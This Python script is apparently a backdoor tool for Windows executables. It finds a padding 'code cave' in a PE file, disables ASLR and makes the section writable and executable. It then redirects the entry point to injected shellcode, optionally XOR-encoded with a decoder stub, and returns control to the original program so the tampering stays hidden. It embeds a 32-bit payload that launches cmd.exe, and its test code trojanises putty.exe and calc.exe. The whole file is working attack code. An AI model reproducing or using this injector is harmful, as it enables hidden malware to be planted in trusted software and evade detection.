import sys
import os
import pefile
from colorama import Fore,Style
from itertools import cycle

#Global
pe = None
aslr = False
x64 = False
minCave = 0

# TODO: shellcode for x64
shellcode64 = bytearray(b"\x90\x90\x90\x90\x90\x90\x90\x90")
# x32 shellcode (WinExec cmd.exe)
shellcode = bytearray.fromhex("FC33D2B23064FF325A8B520C8B52148B722833C9B11833FF33C0AC3C617C022C20C1CF0D03F8E2F081FF5BBC4A6A8B5A108B1275DA8B533C03D3FF72348B527803D38B722003F333C941AD03C381384765745075F4817804726F634175EB8178086464726575E2498B722403F3668B0C4E8B721C03F38B148E03D3526878656301FE4C24036857696E455453FFD268636D6401FE4C24036A0533C98D4C240451FFD0")
shellcode += bytearray(b"\x90\x90\x90\x90\x90\x90\x90\x90"*100) # Temporary solution for issue selecting invalid code-cave


# Colour Function Defintions
def PrintGreen(text):
    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintBlue(text):
    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintRed(text):
    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def xor(data, key):
    return bytes([_a ^ _b for _a, _b in zip(data, cycle(key))])

# ASLR Status Checker / Disabler
def AslrStatus():

    global pe

    # ASLR Check
    dynamicBase = 0x40
    aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040

    # If ASLR is enabled, then disable it and save to new file
    if aslrcheck:
        print (PrintRed("[!]") + " ASLR: \t\t\tEnabled - Disabling ASLR" "\n")
        pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
        return True

    # Continue without ASLR
    else:
        print (PrintGreen("[+]") + " ASLR: \t\t\tDisabled\n")
        return False

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():

    global aslr
    global pe
    global x64
    global minCave

    # ASLR Check
    aslr = AslrStatus()

    print(PrintBlue("[i]") + " Min Cave Size: \t\t" + str(minCave) + " bytes")

    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)

    # Print Number of Section Headers
    print(PrintBlue("[i]") + " Number of Sections: \t" + str(pe.FILE_HEADER.NumberOfSections))

    caveFound = False

    # Loop through sections to identify code cave of minimum bytes
    for section in pe.sections:
        sectionCount = 0

        print(PrintBlue("[i]") + " Checking Section: \t\t" + section.Name.decode())
        if section.SizeOfRawData != 0:
            position = 0
            count = 0

            data = pe.__data__[section.PointerToRawData:section.PointerToRawData + section.SizeOfRawData]

            for byte in data:
                position += 1

                #if byte == 0x00:
                if byte == 0xCC:
                    count += 1
                else:


                    if count > minCave:
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1

                        print(PrintGreen("[+]") + " Code Cave:")
                        print("\tSection: \t\t%s" % section.Name.decode())
                        print ("\tSize: \t\t\t%d bytes" % count)
                        print ("\tRaw: \t\t\t0x%08X" % raw_addr)
                        print ("\tVirtual: \t\t0x%08X" % vir_addr)
                        print("\tCharacteristics: \t" + hex(section.Characteristics))

                        # Set section header characteristics ## RWX
                        section.Characteristics = 0xE0000040
                        print("\tNew Characteristics: \t" + "0xE0000040\n")

                        return vir_addr, raw_addr

                    count = 0
        sectionCount += 1

def fill_slack(data: bytes, custom_shellcode: bytes = None, encoder: bool = False, encoder_multiple: int = 0) -> bytes:

    global pe
    global aslr
    global x64
    global minCave
    global shellcode
    global shellcode64

    data = bytearray(data)
    pe = pefile.PE(data=data)

    if custom_shellcode is not None:
        shellcode = bytearray([int(x, 16) for x in custom_shellcode.split("\\x") if len(x)]) + b""
    
    # Checks if 32 or 64 bit binary
    if hex(pe.FILE_HEADER.Machine) == '0x14c':
        print(PrintGreen("[+]") + " Arch: \t\t\t32-bit")

    else:
        print(PrintGreen("[+]") + " Arch: \t\t\t64-bit")
        shellcode = shellcode64
        x64 = True

    # Stores Image Base (e.g. 0x400000)
    image_base = pe.OPTIONAL_HEADER.ImageBase
    print(PrintBlue("[i]") + " Image Base:\t\t\t" + '0x{:08x}'.format(image_base))

    # Stores entrypoint as 4 byte hex e.g. 0x0004777f)
    entrypoint = '0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    print(PrintBlue("[i]") + " Entry Point:\t\t" + entrypoint)

    minCave = (4 + len(shellcode)) + 10
    # Find Code Cave
    if encoder:
        minCave += 16
        if encoder_multiple > 1:
            minCave = minCave + ((encoder_multiple -1 ) * 3)
    else:
        minCave = minCave

    try:
        newEntryPoint, newRawOffset = FindCave()
    except:
        sys.exit(PrintRed("[!]") + " No Code Cave Found")

    # Stores original entrypoint
    origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)

# Perform injection - Info not set


    if len(shellcode) < 8:
        sys.exit(PrintRed("[!]") + " Minimum shellcode size 8 bytes")

    # Sets new Entry Point and aligns address
    aslr_ep = newEntryPoint - image_base
    epAdjustedSize = 0

    if aslr_ep % 4 == 0:
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
    else:
        epAdjustedSize = (4 - (aslr_ep % 4))
        aslr_ep = (4 - (aslr_ep % 4)) + aslr_ep

        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep

    print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))

    # Reformat original instruction return address to little endian
    if x64:
        returnAddress = (origEntryPoint + image_base).to_bytes(8, 'little')
    else:
        returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

    # XOR Encoding

    if encoder:

        print(PrintGreen("\n[+]") + " Shellcode Encoding:")

        encodedShellcode = shellcode
        encoderCount = 1

        if encoder_multiple > 0:
            encoderCount = encoder_multiple
            if encoderCount > 10:
                encoderCount = 10
                print(PrintRed("[!]") + " Max Encoding:\t\tx10 Iterations")

            xorInstructions = b""
            for x in range(encoderCount):
                encodingKey = os.urandom(1)
                xorInstructions += b"\x80\x30" + encodingKey

                print("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
                encodedShellcode = (xor(encodedShellcode, encodingKey))

            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16) + ((encoderCount - 1) * 3)
            if x64:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))
            else:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16) + ((encoderCount - 1) * 3))
        else:
            encodingKey = os.urandom(1)  # b"\x2f"
            xorInstructions = b"\x80\x30" + encodingKey
            encodedShellcode = (xor(encodedShellcode, encodingKey))
            print ("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
            if x64:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
            else:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16))

            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16)
        if x64:
            endDecodeAddressLittle = (endDecodeAddress + 0x16).to_bytes(8, 'little')
        else:
            endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(4, 'little')


        print("\tStart address:\t\t" + (hex(int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))))
        print("\tEnd Address:\t\t" + hex(endDecodeAddress))

        if x64:
            xorDecoder = b"\x48\xb8" + startDecodeAddress.to_bytes(8, 'little')
            xorDecoder += xorInstructions
            xorDecoder += b"\x48\xFF\xC0"
            xorDecoder += b"\x3D" + endDecodeAddressLittle[:4]

            # JMP Short\xf3 default 1 key
            shortJmp = 0xf3
            shortJmp = shortJmp - (int(str((encoderCount - 1)  * 3)))
            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little') #"\xf3"

            shellcode = xorDecoder + encodedShellcode

        else:
            xorDecoder = b"\xB8" + startDecodeAddress.to_bytes(4, 'little')
            xorDecoder += xorInstructions
            xorDecoder += b"\x40"
            xorDecoder += b"\x3d" + endDecodeAddressLittle

            # JMP Short\xf5 default 1 key
            shortJmp = 0xf5
            shortJmp = shortJmp - ((encoderCount - 1) * 3)
            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little')
            shellcode = xorDecoder + encodedShellcode

    if x64:
        # Balance address to  %4 b

        # Add return address for original program execution
        # mov rax, addr
        # jmp rax
        shellcode += (b"\x48\xb8" + returnAddress)

        paddingBytes = b""
        if len(shellcode) % 4 != 0:
            paddingBytes = b"\x90" * epAdjustedSize
            shellcode += paddingBytes

        shellcode += (b"\xFF\xe0")

    else:
        # Add return address for original program execution
        # mov eax, addr
        # call eax
        shellcode += (b"\xB8" + returnAddress)

        paddingBytes = b""
        if len(shellcode) % 4 != 0:
            paddingBytes = b"\x90" * epAdjustedSize
            shellcode += paddingBytes

        shellcode += (b"\xFF\xD0")

    # Prepend 4 NOPS to shellcode for padding
    shellcode = b"\x90\x90\x90\x90" + shellcode

    # Injects Shellcode
    print (PrintBlue("[i] ") + "Final Shellcode Size:\t" + str(len(shellcode)))
    pe.set_bytes_at_offset(newRawOffset, shellcode)

    print (PrintGreen("\n[+]") + " Filling Slack is Succesful:\t\t")

    # Save and close files
    data = pe.write()
    data[aslr_ep: aslr_ep + len(shellcode)] = shellcode
    return data


# Test code
if __name__ == "__main__":
    # x32
    data = open("putty.exe", "rb").read()
    data = fill_slack(data)
    open("putty_test.exe", "wb").write(data)

    # x64
    data = open("calc.exe", "rb").read()
    data = fill_slack(data)
    open("calc_test.exe", "wb").write(data)